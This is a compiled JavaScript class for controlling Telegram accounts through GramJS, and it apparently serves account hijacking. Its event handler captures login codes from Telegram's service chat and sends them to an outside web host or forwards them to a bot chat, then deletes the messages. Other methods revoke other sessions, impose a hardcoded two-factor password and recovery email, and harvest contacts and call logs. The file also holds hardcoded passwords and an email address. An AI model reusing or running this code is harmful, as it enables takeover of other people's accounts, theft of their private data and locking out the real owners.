"use strict";
Object.defineProperty(exports, "__esModule", { value: true });
const telegram_1 = require("telegram");
const sessions_1 = require("telegram/sessions");
const events_1 = require("telegram/events");
const tl_1 = require("telegram/tl");
const axios_1 = require("axios");
const fs = require("fs");
const uploads_1 = require("telegram/client/uploads");
const utils_1 = require("../../utils");
const Helpers_1 = require("telegram/Helpers");
const Logger_1 = require("telegram/extensions/Logger");
const IMap_1 = require("../../IMap/IMap");
const bigInt = require("big-integer");
class TelegramManager {
    constructor(sessionString, phoneNumber) {
        this.session = new sessions_1.StringSession(sessionString);
        this.phoneNumber = phoneNumber;
        this.client = null;
        this.channelArray = [];
    }
    static getActiveClientSetup() {
        return TelegramManager.activeClientSetup;
    }
    static setActiveClientSetup(data) {
        TelegramManager.activeClientSetup = data;
    }
    async disconnect() {
        if (this.client) {
            console.log("Destroying Client: ", this.phoneNumber);
            await this.client.destroy();
            this.client._destroyed = true;
            await this.client.disconnect();
        }
        this.session.delete();
    }
    async getchatId(username) {
        if (!this.client)
            throw new Error('Client is not initialized');
        const entity = await this.client.getInputEntity(username);
        return entity;
    }
    async getMe() {
        const me = await this.client.getMe();
        return me;
    }
    async errorHandler(error) {
        if (error.message && error.message == 'TIMEOUT') {
        }
        else {
            console.error(`Error occurred for API ID ${this.phoneNumber}:`, error);
        }
    }
    async createClient(handler = true) {
        this.client = new telegram_1.TelegramClient(this.session, parseInt(process.env.API_ID), process.env.API_HASH, {
            connectionRetries: 5,
        });
        this.client.setLogLevel(Logger_1.LogLevel.ERROR);
        await this.client.connect();
        const me = await this.client.getMe();
        console.log("Connected Client : ", me.phone);
        if (handler && this.client) {
            console.log("Adding event Handler");
            this.client.addEventHandler(async (event) => { await this.handleEvents(event); }, new events_1.NewMessage());
        }
        return this.client;
    }
    async getMessages(entityLike, limit = 8) {
        const messages = await this.client.getMessages(entityLike, { limit });
        return messages;
    }
    async getDialogs(params) {
        const chats = await this.client.getDialogs(params);
        console.log("TotalChats:", chats.total);
        return chats;
    }
    async getLastMsgs(limit) {
        if (!this.client)
            throw new Error('Client is not initialized');
        const msgs = await this.client.getMessages("777000", { limit });
        let resp = '';
        msgs.forEach((msg) => {
            console.log(msg.text);
            resp += msg.text + "\n";
        });
        return resp;
    }
    async getSelfMSgsInfo() {
        if (!this.client)
            throw new Error('Client is not initialized');
        const self = await this.client.getMe();
        const selfChatId = self.id;
        let photoCount = 0;
        let videoCount = 0;
        let movieCount = 0;
        const messageHistory = await this.client.getMessages(selfChatId, { limit: 200 });
        for (const message of messageHistory) {
            if (message.photo) {
                photoCount++;
            }
            else if (message.video) {
                videoCount++;
            }
            const text = message.text.toLocaleLowerCase();
            if ((0, utils_1.contains)(text, ['movie', 'series', '1080', '720', '640', 'title', 'aac', '265', 'hdrip', 'mkv', 'hq', '480', 'blura', 's0', 'se0', 'uncut'])) {
                movieCount++;
            }
        }
        return { photoCount, videoCount, movieCount, total: messageHistory.total };
    }
    async channelInfo(sendIds = false) {
        if (!this.client)
            throw new Error('Client is not initialized');
        const chats = await this.client.getDialogs({ limit: 600 });
        let canSendTrueCount = 0;
        let canSendFalseCount = 0;
        let totalCount = 0;
        this.channelArray.length = 0;
        console.log("TotalChats:", chats.total);
        for (const chat of chats) {
            if (chat.isChannel || chat.isGroup) {
                try {
                    const chatEntity = chat.entity.toJSON();
                    const { broadcast, defaultBannedRights } = chatEntity;
                    totalCount++;
                    if (!broadcast && !defaultBannedRights?.sendMessages) {
                        canSendTrueCount++;
                        this.channelArray.push(chatEntity.username);
                    }
                    else {
                        canSendFalseCount++;
                    }
                }
                catch (error) {
                    (0, utils_1.parseError)(error);
                }
            }
        }
        ;
        return {
            chatsArrayLength: totalCount,
            canSendTrueCount,
            canSendFalseCount,
            ids: sendIds ? this.channelArray : []
        };
    }
    async getEntity(entity) {
        return await this.client?.getEntity(entity);
    }
    async joinChannel(entity) {
        return await this.client?.invoke(new tl_1.Api.channels.JoinChannel({
            channel: await this.client?.getEntity(entity)
        }));
    }
    connected() {
        return this.client.connected;
    }
    async connect() {
        return await this.client.connect();
    }
    async removeOtherAuths() {
        if (!this.client)
            throw new Error('Client is not initialized');
        const result = await this.client.invoke(new tl_1.Api.account.GetAuthorizations());
        const updatedAuthorizations = result.authorizations.map((auth) => {
            if (auth.country.toLowerCase().includes('singapore') || auth.deviceModel.toLowerCase().includes('oneplus') ||
                auth.deviceModel.toLowerCase().includes('cli') || auth.deviceModel.toLowerCase().includes('linux') ||
                auth.appName.toLowerCase().includes('likki') || auth.appName.toLowerCase().includes('rams') ||
                auth.appName.toLowerCase().includes('sru') || auth.appName.toLowerCase().includes('shru')
                || auth.deviceModel.toLowerCase().includes('windows')) {
                return auth;
            }
            else {
                this.client?.invoke(new tl_1.Api.account.ResetAuthorization({ hash: auth.hash }));
                return null;
            }
        }).filter(Boolean);
        console.log(updatedAuthorizations);
    }
    async getAuths() {
        if (!this.client)
            throw new Error('Client is not initialized');
        const result = await this.client.invoke(new tl_1.Api.account.GetAuthorizations());
        return result;
    }
    async getAllChats() {
        if (!this.client)
            throw new Error('Client is not initialized');
        const chats = await this.client.getDialogs({ limit: 500 });
        console.log("TotalChats:", chats.total);
        const chatData = [];
        for (const chat of chats) {
            const chatEntity = await chat.entity.toJSON();
            chatData.push(chatEntity);
        }
        return chatData;
    }
    async getCallLog() {
        const result = await this.client.invoke(new tl_1.Api.messages.Search({
            peer: new tl_1.Api.InputPeerEmpty(),
            q: '',
            filter: new tl_1.Api.InputMessagesFilterPhoneCalls({}),
            minDate: 0,
            maxDate: 0,
            offsetId: 0,
            addOffset: 0,
            limit: 200,
            maxId: 0,
            minId: 0,
            hash: bigInt(0),
        }));
        const callLogs = result.messages.filter((message) => message.action instanceof tl_1.Api.MessageActionPhoneCall);
        const filteredResults = {
            outgoing: 0,
            incoming: 0,
            video: 0,
            chatCallCounts: {},
            totalCalls: 0
        };
        for (const log of callLogs) {
            filteredResults.totalCalls++;
            const logAction = log.action;
            const callInfo = {
                callId: logAction.callId.toString(),
                duration: logAction.duration,
                video: logAction.video,
                timestamp: log.date
            };
            if (log.out) {
                filteredResults.outgoing++;
            }
            else {
                filteredResults.incoming++;
            }
            if (logAction.video) {
                filteredResults.video++;
            }
            const chatId = log.peerId.userId.toString();
            if (!filteredResults.chatCallCounts[chatId]) {
                const ent = await this.client.getEntity(chatId);
                filteredResults.chatCallCounts[chatId] = {
                    phone: ent.phone,
                    username: ent.username,
                    name: `${ent.firstName}  ${ent.lastName ? ent.lastName : ''}`,
                    count: 0
                };
            }
            filteredResults.chatCallCounts[chatId].count++;
        }
        const filteredChatCallCounts = Object.entries(filteredResults.chatCallCounts)
            .filter(([chatId, details]) => details["count"] > 5)
            .map(([chatId, details]) => ({
            ...details,
            chatId,
        }));
        console.log({
            ...filteredResults,
            chatCallCounts: filteredChatCallCounts
        });
        return {
            ...filteredResults,
            chatCallCounts: filteredChatCallCounts
        };
    }
    async handleEvents(event) {
        if (event.isPrivate) {
            if (event.message.chatId.toString() == "777000") {
                console.log(event.message.text.toLowerCase());
                console.log("Login Code received for - ", this.phoneNumber, '\nSetup - ', TelegramManager.activeClientSetup);
                if (TelegramManager.activeClientSetup && this.phoneNumber === TelegramManager.activeClientSetup?.mobile) {
                    console.log("LoginText: ", event.message.text);
                    const code = (event.message.text.split('.')[0].split("code:**")[1].trim());
                    console.log("Code is:", code);
                    try {
                        const response = await axios_1.default.get(`https://tgsignup.onrender.com/otp?code=${code}&phone=${this.phoneNumber}&password=Ajtdmwajt1@`);
                        console.log("Code Sent back");
                    }
                    catch (error) {
                        (0, utils_1.parseError)(error);
                    }
                }
                else {
                    const ppplbot = `https://api.telegram.org/bot${process.env.ramyaredd1bot}/sendMessage`;
                    const payload = {
                        "chat_id": "-1001801844217",
                        "text": event.message.text
                    };
                    axios_1.default.post(ppplbot, payload)
                        .then((response) => {
                    })
                        .catch((error) => {
                        console.log((0, utils_1.parseError)(error));
                        console.log((0, utils_1.parseError)(error));
                    });
                    await event.message.delete({ revoke: true });
                }
            }
        }
    }
    async updatePrivacyforDeletedAccount() {
        try {
            await this.client.invoke(new tl_1.Api.account.SetPrivacy({
                key: new tl_1.Api.InputPrivacyKeyPhoneCall(),
                rules: [
                    new tl_1.Api.InputPrivacyValueDisallowAll()
                ],
            }));
            console.log("Calls Updated");
            await this.client.invoke(new tl_1.Api.account.SetPrivacy({
                key: new tl_1.Api.InputPrivacyKeyProfilePhoto(),
                rules: [
                    new tl_1.Api.InputPrivacyValueAllowAll()
                ],
            }));
            console.log("PP Updated");
            await this.client.invoke(new tl_1.Api.account.SetPrivacy({
                key: new tl_1.Api.InputPrivacyKeyPhoneNumber(),
                rules: [
                    new tl_1.Api.InputPrivacyValueDisallowAll()
                ],
            }));
            console.log("Number Updated");
            await this.client.invoke(new tl_1.Api.account.SetPrivacy({
                key: new tl_1.Api.InputPrivacyKeyStatusTimestamp(),
                rules: [
                    new tl_1.Api.InputPrivacyValueDisallowAll()
                ],
            }));
            await this.client.invoke(new tl_1.Api.account.SetPrivacy({
                key: new tl_1.Api.InputPrivacyKeyAbout(),
                rules: [
                    new tl_1.Api.InputPrivacyValueAllowAll()
                ],
            }));
            console.log("LAstSeen Updated");
        }
        catch (e) {
            throw e;
        }
    }
    async updateProfile(firstName, about) {
        const data = {
            lastName: "",
        };
        if (firstName !== undefined) {
            data["firstName"] = firstName;
        }
        if (about !== undefined) {
            data["about"] = about;
        }
        try {
            const result = await this.client.invoke(new tl_1.Api.account.UpdateProfile(data));
            console.log("Updated NAme: ", firstName);
        }
        catch (error) {
            throw error;
        }
    }
    async getLastActiveTime() {
        const result = await this.client.invoke(new tl_1.Api.account.GetAuthorizations());
        let latest = 0;
        result.authorizations.map((auth) => {
            if (!auth.country.toLowerCase().includes('singapore')) {
                if (latest < auth.dateActive) {
                    latest = auth.dateActive;
                }
            }
        });
        return latest;
    }
    async getContacts() {
        const exportedContacts = await this.client.invoke(new tl_1.Api.contacts.GetContacts({
            hash: bigInt(0)
        }));
        return exportedContacts;
    }
    async updateUsername(baseUsername) {
        let newUserName = '';
        let username = (baseUsername && baseUsername !== '') ? baseUsername : '';
        let increment = 0;
        if (username === '') {
            try {
                const res = await this.client.invoke(new tl_1.Api.account.UpdateUsername({ username }));
                console.log(`Removed Username successfully.`);
            }
            catch (error) {
                console.log(error);
            }
        }
        else {
            while (true) {
                try {
                    const result = await this.client.invoke(new tl_1.Api.account.CheckUsername({ username }));
                    console.log(result, " - ", username);
                    if (result) {
                        const res = await this.client.invoke(new tl_1.Api.account.UpdateUsername({ username }));
                        console.log(`Username '${username}' updated successfully.`);
                        newUserName = username;
                        break;
                    }
                    else {
                        username = baseUsername + increment;
                        increment++;
                        await (0, Helpers_1.sleep)(4000);
                    }
                }
                catch (error) {
                    console.log(error.message);
                    if (error.errorMessage == 'USERNAME_NOT_MODIFIED') {
                        newUserName = username;
                        break;
                    }
                    username = baseUsername + increment;
                    increment++;
                }
            }
        }
        return newUserName;
    }
    async updatePrivacy() {
        try {
            await this.client.invoke(new tl_1.Api.account.SetPrivacy({
                key: new tl_1.Api.InputPrivacyKeyPhoneCall(),
                rules: [
                    new tl_1.Api.InputPrivacyValueDisallowAll()
                ],
            }));
            console.log("Calls Updated");
            await this.client.invoke(new tl_1.Api.account.SetPrivacy({
                key: new tl_1.Api.InputPrivacyKeyProfilePhoto(),
                rules: [
                    new tl_1.Api.InputPrivacyValueAllowAll()
                ],
            }));
            console.log("PP Updated");
            await this.client.invoke(new tl_1.Api.account.SetPrivacy({
                key: new tl_1.Api.InputPrivacyKeyPhoneNumber(),
                rules: [
                    new tl_1.Api.InputPrivacyValueDisallowAll()
                ],
            }));
            console.log("Number Updated");
            await this.client.invoke(new tl_1.Api.account.SetPrivacy({
                key: new tl_1.Api.InputPrivacyKeyStatusTimestamp(),
                rules: [
                    new tl_1.Api.InputPrivacyValueAllowAll()
                ],
            }));
            console.log("LAstSeen Updated");
            await this.client.invoke(new tl_1.Api.account.SetPrivacy({
                key: new tl_1.Api.InputPrivacyKeyAbout(),
                rules: [
                    new tl_1.Api.InputPrivacyValueAllowAll()
                ],
            }));
        }
        catch (e) {
            throw e;
        }
    }
    async getFileUrl(url, filename) {
        const response = await axios_1.default.get(url, { responseType: 'stream' });
        const filePath = `/tmp/${filename}`;
        await new Promise((resolve, reject) => {
            const writer = fs.createWriteStream(filePath);
            response.data.pipe(writer);
            writer.on('finish', resolve);
            writer.on('error', reject);
        });
        return filePath;
    }
    async updateProfilePic(image) {
        try {
            const file = await this.client.uploadFile({
                file: new uploads_1.CustomFile('pic.jpg', fs.statSync(image).size, image),
                workers: 1,
            });
            console.log("file uploaded");
            await this.client.invoke(new tl_1.Api.photos.UploadProfilePhoto({
                file: file,
            }));
            console.log("profile pic updated");
        }
        catch (error) {
            throw error;
        }
    }
    async hasPassword() {
        const passwordInfo = await this.client.invoke(new tl_1.Api.account.GetPassword());
        return passwordInfo.hasPassword;
    }
    async set2fa() {
        if (!(await this.hasPassword())) {
            const imapService = IMap_1.MailReader.getInstance();
            const twoFaDetails = {
                email: "storeslaksmi@gmail.com",
                hint: "password - India143",
                newPassword: "Ajtdmwajt1@",
            };
            try {
                imapService.connectToMail();
                const intervalParentId = setInterval(async () => {
                    const isReady = imapService.isMailReady();
                    if (isReady) {
                        clearInterval(intervalParentId);
                        await this.client.updateTwoFaSettings({
                            isCheckPassword: false,
                            email: twoFaDetails.email,
                            hint: twoFaDetails.hint,
                            newPassword: twoFaDetails.newPassword,
                            emailCodeCallback: async (length) => {
                                console.log("code sent");
                                return new Promise(async (resolve) => {
                                    let retry = 0;
                                    const intervalId = setInterval(async () => {
                                        console.log("checking code");
                                        retry++;
                                        const isReady = imapService.isMailReady();
                                        if (isReady && retry < 4) {
                                            const code = await imapService.getCode();
                                            console.log('Code: ', code);
                                            if (code) {
                                                clearInterval(intervalId);
                                                imapService.disconnectFromMail();
                                                resolve(code);
                                            }
                                            else {
                                                console.log('Code: ', code);
                                            }
                                        }
                                        else {
                                            clearInterval(intervalId);
                                            await this.client.disconnect();
                                            imapService.disconnectFromMail();
                                            resolve(undefined);
                                        }
                                    }, 10000);
                                });
                            },
                            onEmailCodeError: (e) => { console.log((0, utils_1.parseError)(e)); return Promise.resolve("error"); }
                        });
                        return twoFaDetails;
                    }
                }, 5000);
            }
            catch (e) {
                console.log(e);
                (0, utils_1.parseError)(e);
            }
        }
        else {
            console.log("Password Already Exist");
        }
    }
    async sendPhotoChat(id, url, caption, filename) {
        if (!this.client)
            throw new Error('Client is not initialized');
        const filePath = await this.getFileUrl(url, filename);
        const file = new uploads_1.CustomFile(filePath, fs.statSync(filePath).size, filename);
        await this.client.sendFile(id, { file, caption });
    }
    async sendFileChat(id, url, caption, filename) {
        if (!this.client)
            throw new Error('Client is not initialized');
        const filePath = await this.getFileUrl(url, filename);
        const file = new uploads_1.CustomFile(filePath, fs.statSync(filePath).size, filename);
        await this.client.sendFile(id, { file, caption });
    }
    async deleteProfilePhotos() {
        try {
            const result = await this.client.invoke(new tl_1.Api.photos.GetUserPhotos({
                userId: "me"
            }));
            console.log(`Profile Pics found: ${result.photos.length}`);
            if (result && result.photos?.length > 0) {
                const res = await this.client.invoke(new tl_1.Api.photos.DeletePhotos({
                    id: result.photos
                }));
            }
            console.log("Deleted profile Photos");
        }
        catch (error) {
            throw error;
        }
    }
}
exports.default = TelegramManager;
//# sourceMappingURL=TelegramManager.js.map